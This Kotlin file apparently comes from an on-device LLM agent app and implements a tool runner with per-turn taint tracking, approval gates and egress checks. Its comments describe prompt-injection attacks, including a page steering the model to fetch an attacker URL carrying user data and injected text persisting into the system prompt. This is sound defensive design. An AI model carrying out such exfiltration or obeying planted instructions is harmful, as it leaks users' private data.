/*
 * Copyright 2026 The OpenWeights Authors
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package io.github.alpharomercoma.openweights.core.tools

import io.github.alpharomercoma.openweights.core.common.model.ChatMessage
import io.github.alpharomercoma.openweights.core.common.model.ToolCall
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.async
import kotlinx.coroutines.coroutineScope
import kotlinx.serialization.json.Json
import java.util.concurrent.ConcurrentHashMap

/** One step the agent took, as the transcript shows it. */
sealed interface AgentStep {
    /** A tool the model asked for, before it has run. */
    data class Requested(val call: ToolCall) : AgentStep

    /** A tool that ran, with what it returned and whether it actually accomplished the call. */
    data class Ran(
        val call: ToolCall,
        val result: String,
        val millis: Long,
        val successful: Boolean = true,
        val evidence: ToolEvidence? = null,
    ) : AgentStep

    /** A tool the user declined, or that plan mode refused to run. */
    data class Skipped(val call: ToolCall, val why: String) : AgentStep
}

/**
 * The program a step ran, or null when the step did not run one.
 *
 * Lives here rather than in the UI because reading a tool call's arguments is this module's
 * job and it already owns the parser: the same argument is spelled `source`, `code`,
 * `script` or `js` depending on the model, and the interface should not have to know that.
 *
 * The UI needs it because a program is not a tool result. Rendered as one it is a paragraph
 * of monospaced prose with no language, no colours and no way to copy it, which is the wrong
 * shape for the one kind of output somebody might want to keep.
 */
fun AgentStep.scriptSource(): String? {
    val call = (this as? AgentStep.Ran)?.call ?: return null
    if (call.name != RunScriptTool.NAME) return null
    return call.textArgument("source", "code", "script", "js")?.takeIf { it.isNotBlank() }
}

/**
 * True only when this turn searched successfully and then read one of the returned sources.
 *
 * Invocation is not evidence: web tools report validation, network, HTTP and content
 * failures as ordinary text so the model can recover. Typed evidence is attached only by
 * the successful branches inside those tools, and the fetched address must be one the search
 * actually returned. Conservative false negatives retry a step; a false positive would let
 * a fabricated research claim into the final report.
 */
fun Iterable<AgentStep>.correlatedWebResearchSources(): Set<String> {
    val ran = filterIsInstance<AgentStep.Ran>().filter { it.successful }
    val sources = ran.mapNotNull { it.evidence as? ToolEvidence.Search }
        .flatMap { it.urls }
        .toSet()
    if (sources.isEmpty()) return emptySet()

    return ran.mapNotNull { it.evidence as? ToolEvidence.Fetch }
        .filter { it.requestedUrl in sources }
        .map { it.finalUrl }
        .toSet()
}

/** Whether [correlatedWebResearchSources] found at least one source the turn actually read. */
fun Iterable<AgentStep>.hasWebResearchEvidence(): Boolean =
    correlatedWebResearchSources().isNotEmpty()

/** The call a step belongs to, whatever became of it. */
internal fun AgentStep.callId(): String = when (this) {
    is AgentStep.Requested -> call.id
    is AgentStep.Ran -> call.id
    is AgentStep.Skipped -> call.id
}

/**
 * What makes two calls the same call.
 *
 * The arguments are canonicalised through the parser when they will go through it, so
 * `{"query":"x"}` and `{"query": "x"}` are one call rather than two. When they will not,
 * which for a model this size is often, the text stands as written: the alternative is
 * stripping whitespace out of the string, and that would fold a search for "new york" into
 * one for "newyork". Missing a repeat costs a round; inventing one refuses a call the model
 * meant, so the doubt goes that way.
 */
internal fun ToolCall.settledKey(): String {
    val canonical = runCatching { Json.parseToJsonElement(argumentsJson).toString() }
        .getOrDefault(argumentsJson.trim())
    return "$name($canonical)"
}

/** What the model is told about this step. */
internal fun AgentStep.report(): String = when (this) {
    is AgentStep.Requested -> "pending"
    is AgentStep.Ran -> result
    is AgentStep.Skipped -> why
}

/** What the runner decided to do next. */
sealed interface AgentDecision {
    /** Nothing was asked for. The turn is over. */
    data object Finished : AgentDecision

    /** These calls ran, and the conversation now has their results appended. */
    data class Continue(val messages: List<ChatMessage>, val steps: List<AgentStep>) :
        AgentDecision

    /** The model kept asking past the limit. The turn stops with what it has. */
    data class Exhausted(val steps: List<AgentStep>) : AgentDecision
}

/**
 * Runs the tools a model asked for, and says whether the turn should continue.
 *
 * Deliberately not a loop: the loop belongs to whatever owns cancellation and the
 * transcript, and hiding one here would mean a runner that cannot be stopped halfway. This
 * decides one round, which is the part worth testing on its own.
 *
 * @param approve asked once per call in [AgentMode.ASK]. Returning false skips that call
 * and tells the model why, so it can answer without the tool rather than stall.
 */
class AgentRunner(
    private val registry: ToolRegistry,
    private val maxRounds: Int = DEFAULT_MAX_ROUNDS,
    /**
     * Whether a stranger's words are already in the prompt when this turn opens.
     *
     * False for a turn that begins with nothing but the conversation, which is why the
     * suspicion below is per turn. It is true when [ToolNotes] has carried a page or a file
     * from an earlier turn into this question, because then the text is in the window again
     * and a guard that reset with the turn would be a guard those notes walked around.
     */
    carriesUntrustedText: Boolean = false,
    /** And the same for the user's own text. See [carriesUntrustedText]. */
    carriesPrivateData: Boolean = false,
) {
    /**
     * Whether text somebody else wrote has reached the model during this turn.
     *
     * State on the instance, and the instance is one turn: a runner is built per turn, so this
     * resets when the turn does, except where the constructor says it does not. The scope
     * follows the text rather than the clock. A file read an hour ago is usually out of the
     * window, and holding the suspicion across a whole conversation would ask about every
     * search anyone made afterwards; but where [ToolNotes] has kept that file in the prompt,
     * the turn it reaches starts suspicious, because the thing being guarded is still there.
     */
    @Volatile
    private var readUntrustedText = carriesUntrustedText

    /**
     * Whether something of the user's has reached the model during this turn.
     *
     * Same scope and the same reasoning as [readUntrustedText], and tracked apart from it
     * because the two guard different things. Untrusted text is a risk about who is giving
     * the orders; private data is a risk about what could be carried out.
     */
    @Volatile
    private var readPrivateData = carriesPrivateData

    /**
     * Calls this turn has already answered, and what to say if one is asked for again.
     *
     * A small model that has just been handed a tool result frequently asks for the same
     * thing again, word for word: it is the shape most recently in front of it, and repeating
     * a shape is what these models are best at. Each repeat costs a full prefill of a
     * conversation that has grown, and on the round budget here it costs the round in which
     * the answer was going to be written.
     *
     * Both halves are keyed the same way, on the name and the arguments together, because
     * both are claims about one exact call. A search for something else is a new call; the
     * same search twice is a loop. And a tool the user declined is only settled for the
     * arguments they saw: declining one address is not declining the tool, and treating it
     * that way would take the decision away from the person who made it.
     *
     * Per turn, like [readUntrustedText] and for the same reason: this instance is one turn,
     * so the next question starts with nothing settled.
     */
    private val settled = ConcurrentHashMap<String, String>()

    suspend fun step(
        calls: List<ToolCall>,
        round: Int,
        mode: AgentMode,
        approve: suspend (ToolCall) -> Boolean,
        now: () -> Long = System::currentTimeMillis,
    ): AgentDecision {
        if (calls.isEmpty()) return AgentDecision.Finished
        // Counted in rounds rather than in calls, because a model that asks for three
        // things at once has not looped, it has been efficient.
        if (round >= maxRounds) {
            return AgentDecision.Exhausted(
                calls.map { AgentStep.Skipped(it, "stopped after $maxRounds rounds of tools") },
            )
        }

        val steps = if (canRunInParallel(calls, mode)) {
            // Every call in this branch is a read-only, no-approval lookup. Keeping the
            // result list in model order makes the transcript deterministic even though the
            // wall-clock completion order differs.
            coroutineScope {
                calls.map { call -> async { decide(call, mode, approve, now) } }.map { it.await() }
            }
        } else {
            calls.map { call -> decide(call, mode, approve, now) }
        }
        // Every step answers, including the ones that did not run: a model told nothing
        // about a call it made has no way to finish the turn.
        val messages = steps.map { ChatMessage.toolResult(it.callId(), it.report()) }
        return AgentDecision.Continue(messages, steps)
    }

    /**
     * One call, and whether plan mode lets it through.
     *
     * Per call rather than for the round, because a model asks for a question and a search in
     * the same breath, and refusing both is how plan mode ended up unable to plan. What plan
     * mode is refusing is errands, so what it refuses is tools that are errands: see
     * [Tool.runsWhilePlanning].
     */
    private suspend fun decide(
        call: ToolCall,
        mode: AgentMode,
        approve: suspend (ToolCall) -> Boolean,
        now: () -> Long,
    ): AgentStep {
        val planning = registry.find(call.name)?.runsWhilePlanning == true
        if (mode == AgentMode.PLAN && !planning) {
            // Answered, not merely refused. Plan mode tells the model not to call anything
            // and small models call anyway, and a turn that stops on the refusal ends on
            // whatever fragment preceded the call rather than on a plan. Telling it the
            // call did not run is what buys the pass in which it writes one.
            return AgentStep.Skipped(call, "plan mode: nothing was run")
        }
        return runOne(call, mode, approve, now)
    }

    private fun canRunInParallel(calls: List<ToolCall>, mode: AgentMode): Boolean {
        if (mode != AgentMode.AUTO || calls.size < 2) return false
        if (calls.map { it.settledKey() }.distinct().size != calls.size) return false
        return calls.all { call ->
            val tool = registry.find(call.name) ?: return@all false
            tool.parallelSafe &&
                !tool.alwaysAsks &&
                !tool.asksInAuto(call) &&
                !tool.readsPrivateData &&
                !tool.writesDurableData &&
                !tool.sendsWhereTheModelSays &&
                // The taint, not only the tool. Two searches are parallel safe in
                // themselves, but once the turn has read something private they both stop
                // at the egress check and ask, and the screen holds one question at a time:
                // the second overwrites the first and the coroutine waiting on it is never
                // answered. Anything that could ask runs one at a time instead.
                !(readPrivateData && tool.leavesTheDevice)
        }
    }

    private suspend fun runOne(
        call: ToolCall,
        mode: AgentMode,
        approve: suspend (ToolCall) -> Boolean,
        now: () -> Long,
    ): AgentStep {
        // Before the tool is even looked up, because the cheapest round trip is the one that
        // does not happen and the answer here does not depend on the tool.
        settled[call.settledKey()]?.let { return AgentStep.Skipped(call, it) }

        val tool = registry.find(call.name)
            ?: return AgentStep.Skipped(
                call,
                "There is no tool called ${call.name}. " +
                    "Available: ${registry.definitions.joinToString { it.name }}.",
            )

        if (!allowed(tool, call, mode, approve)) {
            // Written to read sensibly twice over: it goes back to the model as this call's
            // result, and onto the chip in the transcript that already says which tool and
            // that it was skipped.
            settled[call.settledKey()] = "Already declined by the user, with these same " +
                "arguments. Answer without it."
            return AgentStep.Skipped(call, "The user declined to run ${call.name}.")
        }

        val startedAt = now()
        // A tool that throws must not end the turn: the model is told what went wrong and
        // can try something else, which is the whole point of a tool loop.
        //
        // Cancellation is the exception, and it has to be rethrown. runCatching swallows
        // it like anything else, which turned Stop pressed during a slow request into a
        // tool failure the agent then carried on from: the turn kept going after the user
        // had ended it.
        val execution = try {
            tool.execute(call)
        } catch (cancellation: CancellationException) {
            throw cancellation
        } catch (@Suppress("TooGenericExceptionCaught") failure: Exception) {
            ToolExecution.failure(
                "${call.name} failed: ${failure.message ?: "unknown error"}",
            )
        }
        // Set after the run rather than before it, so a tool that failed to read anything
        // does not spend the turn's freedom on text that never arrived.
        if (execution.successful && tool.returnsUntrustedText) readUntrustedText = true
        if (execution.successful && tool.readsPrivateData) readPrivateData = true
        // Pointed at rather than repeated. The result is already in the conversation as a
        // tool message, so sending it a second time would spend the context twice over to
        // tell the model something it can see.
        //
        // Only a call that got somewhere is settled. A socket that went away is the one case
        // where asking again for exactly the same thing is the right move, and a breaker that
        // caught it would turn a blip into the end of the turn.
        if (execution.successful) {
            settled[call.settledKey()] = "Already run this turn with these same arguments. " +
                "Its result is above; answer from that rather than calling it again."
        }
        return AgentStep.Ran(
            call = call,
            result = execution.text,
            millis = now() - startedAt,
            successful = execution.successful,
            evidence = execution.evidence,
        )
    }

    /**
     * Whether this call runs, asking the user if the mode and the tool both say to.
     *
     * Auto is about removing pointless taps, and the test for pointless is whether anything
     * about this turn has changed what the call could do. Nothing has read anything yet, so
     * the first call of a turn never asks whatever it is.
     */
    @Suppress("ReturnCount") // Ordered security gates are easier to audit as fail-fast checks.
    private suspend fun allowed(
        tool: Tool,
        call: ToolCall,
        mode: AgentMode,
        approve: suspend (ToolCall) -> Boolean,
    ): Boolean {
        // Nothing here asks permission to do the thing the app is for.
        //
        // There were two more gates. One was a single question before the first thing ever
        // left the device, so that discovery and consent would be the same event. The other
        // was `alwaysAsk` on fetching a page, because the address is the model's choice
        // rather than the user's. Both were reasonable and both are gone: an agent that
        // stops to ask whether it may search is not an agent, and the answer to "did it
        // search" is already in the transcript, where every call is a row in the reply it
        // produced, naming the tool and the argument it was given. Disclosure after the
        // fact, in the place you are already looking, beats a dialog before it.
        //
        // Tools is where this is decided instead. Every tool has a switch, the ones that
        // leave the device sit under a heading saying so, and the screen is one tap from
        // the drawer.
        //
        // What survives is two shapes of exfiltration, and neither is a matter of taste.
        //
        // The first is a page choosing where the next call goes: read something, be told
        // "now fetch https://example.test/?d=...", and the attacker reads their own server.
        // That needs the destination to be the model's to pick, which is `fetch_url` and
        // nothing else. It used to be written as "anything that leaves the device", and that
        // swept up `web_search`, whose destination is the provider this app is configured
        // with however the query reads. The cost of the wider rule was paid every turn: two
        // searches is an ordinary way to answer one question, and the second one stopped and
        // asked. A prompt that appears in the normal case is a prompt that gets tapped
        // through, which leaves the app slower and no safer.
        //
        // The second is the user's own text going out, and there the destination does not
        // matter: a file read from the shared folder can be carried by a search as easily as
        // by a fetch. So that one is still gated on anything leaving the device at all.
        //
        // A persistent or destructive effect is not an egress question and YOLO must not
        // waive it. YOLO disappears with the process; remember, watch and replacement do
        // not. Checking this before the YOLO return prevents an injected page from turning
        // a temporary mode into permanent prompt text or recurring unattended work.
        if (tool.asksInAuto(call)) return approve(call)

        // Untrusted pages and tool results must not be able to persist their instructions
        // into the user's workspace. A clean, additive save remains automatic in Auto;
        // once the turn has consumed untrusted text, every durable write is explicit.
        if (readUntrustedText && tool.writesDurableData) return approve(call)

        // Yolo waives the two egress checks below, and nothing else: it is the user saying
        // they know what those checks are for and would rather have the seconds. It has to
        // be typed, is named in the runtime line while on, and is gone with the process.
        if (mode == AgentMode.YOLO) return true
        val couldBeToldWhereToGo = readUntrustedText && tool.sendsWhereTheModelSays
        val couldCarryPrivateData = readPrivateData && tool.leavesTheDevice

        // Asked first, and not skippable. A reviewer read this as a complete egress bypass:
        // if an outbound tool ever declared `needsApproval = false`, `!tool.needsApproval`
        // would short-circuit the whole expression and a page could talk the model into
        // posting a private file with no prompt. That is not true today, because the default
        // is true and only the two internal planning tools override it, so the reviewer's
        // scenario does not reach. It was one keystroke away from being true, and a
        // security property that depends on nobody setting a flag is not a property.
        //
        // These two conditions now decide on their own. A tool that is exempt from routine
        // approval is not thereby exempt from the egress rule.
        if (couldBeToldWhereToGo || couldCarryPrivateData) return approve(call)

        // A tool whose effect outlives the conversation asks in every mode. `needsApproval`
        // is documented as an ASK-mode question and behaves as one, so setting it on
        // `remember` and `watch` bought nothing in AUTO, which is the default. An injected
        // instruction could therefore write itself into the permanent system prefix, or
        // schedule recurring unattended work, without the user seeing anything.
        return mode == AgentMode.AUTO || !tool.needsApproval || approve(call)
    }

    companion object {
        /**
         * How many rounds of tools one question may take.
         *
         * Every round is a full prefill of a growing conversation on a phone, so this is a
         * budget of seconds as much as of steps: two rounds is search then answer, which
         * is what a question needs when it needs anything.
         *
         * It was four, which measured at five minutes for "gojo vs sukuna": search, read a
         * page, search again, read again, each round adding thousands of characters to a
         * prompt that then had to be re-read. A hosted assistant answers that from memory
         * in seconds. The budget is not what makes an agent good; knowing it does not need
         * one is, and a small ceiling forces the question.
         */
        const val DEFAULT_MAX_ROUNDS = 2

        /**
         * The ceiling for a turn whose tools are steps rather than errands.
         *
         * Find the file, read it, write it: three rounds before a word reaches the user, so
         * two refuses the one that saves the work. Four leaves a single round of slack for
         * the model to look twice, and no more, because the argument above still holds and
         * every extra round re-reads a prompt that has grown.
         */
        const val CHAINED_MAX_ROUNDS = 4
    }
}
